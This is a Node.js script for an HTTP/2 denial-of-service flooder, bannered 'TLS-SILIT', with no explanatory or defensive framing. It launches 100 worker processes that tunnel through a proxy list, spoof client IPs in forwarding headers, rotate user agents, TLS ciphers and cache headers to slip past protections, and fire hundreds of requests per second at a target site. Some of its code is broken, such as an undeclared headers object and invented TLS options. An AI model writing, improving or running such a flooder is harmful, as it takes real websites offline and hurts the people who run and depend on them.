const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});
process.on('unhandledRejection', function (er) {});

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    var result = "";
    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: "https://google.com",
    Rate: 400,
    threads: 100,
    proxyFile: "proxies.txt"
}

const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];

const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'ecdsa_sha1',
    'ed25519',
    'ed448',
    'ecdsa_sha224',
    'rsa_pkcs1_sha1',
    'rsa_pss_pss_sha256',
    'dsa_sha256',
    'dsa_sha384',
    'dsa_sha512',
    'dsa_sha224',
    'dsa_sha1',
    'rsa_pss_pss_sha384',
    'rsa_pkcs1_sha2240',
    'rsa_pss_pss_sha512',
    'sm2sig_sm3',
    'ecdsa_secp521r1_sha512',
];

const lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK',
    'en-GB,en;q=0.8',
    'en-GB,en;q=0.9',
    'en-GB,en;q=0.7',
    '*',
    'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9',
    'de-AT, de-DE;q=0.9, en;q=0.5',
    'cs;q=0.5',
    'da, en-gb;q=0.8, en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'tr',
    'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
];

const accept_header = [
    'application/json',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
];

const encoding_header = [
    '*',
    '*/*',
    'gzip',
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    'gzip, deflate',
    'br',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip;q=1.0, identity; q=0.5, *;q=0',
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
    'compress;q=0.5, gzip;q=1.0',
    'identity',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, lzma, sdch',
    'deflate'
];

const controle_header = [
    'max-age=604800',
    'proxy-revalidate',
    'public, max-age=0',
    'max-age=315360000',
    'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    's-maxage=604800',
    'max-stale',
    'public, immutable, max-age=31536000',
    'must-revalidate',
    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'max-age=31536000,public,immutable',
    'max-age=31536000,public',
    'min-fresh',
    'private',
    'public',
    's-maxage',
    'no-cache',
    'no-cache, no-transform',
    'max-age=2592000',
    'no-store',
    'no-transform',
    'max-age=31557600',
    'stale-if-error',
    'only-if-cached',
    'max-age=0',
    'must-understand, no-store',
    'max-age=31536000; includeSubDomains',
    'max-age=31536000; includeSubDomains; preload',
    'max-age=120',
    'max-age=0,no-cache,no-store,must-revalidate',
    'public, max-age=604800, immutable',
    'max-age=0, must-revalidate, private',
    'max-age=0, private, must-revalidate',
    'max-age=604800, stale-while-revalidate=86400',
    'max-stale=3600',
    'public, max-age=2678400',
    'min-fresh=600',
    'public, max-age=30672000',
    'max-age=31536000, immutable',
    'max-age=604800, stale-if-error=86400',
    'public, max-age=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
    'public, s-maxage=600, max-age=60',
    'public, max-age=31536000',
    'max-age=14400, public',
    'max-age=14400',
    'max-age=600, private',
    'public, s-maxage=600, max-age=60',
    'no-store, no-cache, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64'
];

const uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

const Methods = [
    "GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"
];

const queryStrings = [
    "&",
    "="
];

const pathts = [
    "/",
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment",
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04"
];

const refers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q="
];

const ip_spoof = () => {
    const ip_segment = () => {
        return Math.floor(Math.random() * 255);
    };
    return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`;
};

var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

if (cluster.isMaster) {
    console.clear();
    console.log(`
████████╗██╗░░░░░░██████╗░░░░░░░██████╗██╗██╗░░░░░██╗████████╗
╚══██╔══╝██║░░░░░██╔════╝░░░░░░██╔════╝██║██║░░░░░██║╚══██╔══╝
░░░██║░░░██║░░░░░╚█████╗░█████╗╚█████╗░██║██║░░░░░██║░░░██║░░░
░░░██║░░░██║░░░░░░╚═══██╗╚════╝░╚═══██╗██║██║░░░░░██║░░░██║░░░
░░░██║░░░███████╗██████╔╝░░░░░░██████╔╝██║███████╗██║░░░██║░░░
░░░╚═╝░░░╚══════╝╚═════╝░░░░░░░╚═════╝░╚═╝╚══════╝╚═╝░░░╚═╝░░░
`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        console.log(`[\x1b[35mINFO\x1b[0m] Attack Thread ${counter} Started`);
    }
    console.log(`[\x1b[35mSYSTEM\x1b[0m] The Attack Has Started`);
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
headers[":method"] = randomMethod;
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = "application/json";
headers[":scheme"] = "https";
headers["x-download-options"] = "noopen";
headers["Cross-Origin-Embedder-Policy"] = "require-corp";
headers["Cross-Origin-Opener-Policy"] = "same-origin";
headers["accept"] = randomElement(accept_header);
headers["accept-language"] = randomElement(lang_header);
headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
headers["x-cache"] = "MISS";
headers["Content-Security-Policy"] = "default-src 'self'";
headers["accept-encoding"] = randomElement(encoding_header);
headers["cache-control"] = randomElement(controle_header);
headers["x-frame-options"] = "SAMEORIGIN";
headers["x-xss-protection"] = "1; mode=block";
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "trailers";
headers["pragma"] = "no-cache";
headers["sec-ch-ua-platform"] = "\"Windows\"";
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["X-Forwarded-Proto"] = "https";
headers["sec-ch-ua"] = "\"Chromium\";v=\"118\", \"Google Chrome\";v=\"118\", \"Not=A?Brand\";v=\"99\"";
headers["sec-ch-ua-mobile"] = "?0";
headers["vary"] = "Accept-Encoding";
headers["x-requested-with"] = "XMLHttpRequest";
headers["set-cookie"] = "session_id=" + randomString(32);
headers["Server"] = "cloudflare";
headers["strict-transport-security"] = "max-age=31536000; includeSubDomains";
headers["access-control-allow-headers"] = "Content-Type, Authorization";
headers["access-control-allow-origin"] = "*";
headers["Content-Encoding"] = "gzip";
headers["alt-svc"] = 'h3=":443"; ma=86400';
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = "websocket";
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    var uap1 = uap[Math.floor(Math.random() * uap.length)];
    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = uap1;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 900000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            servername: url.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return;
                        });
                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}
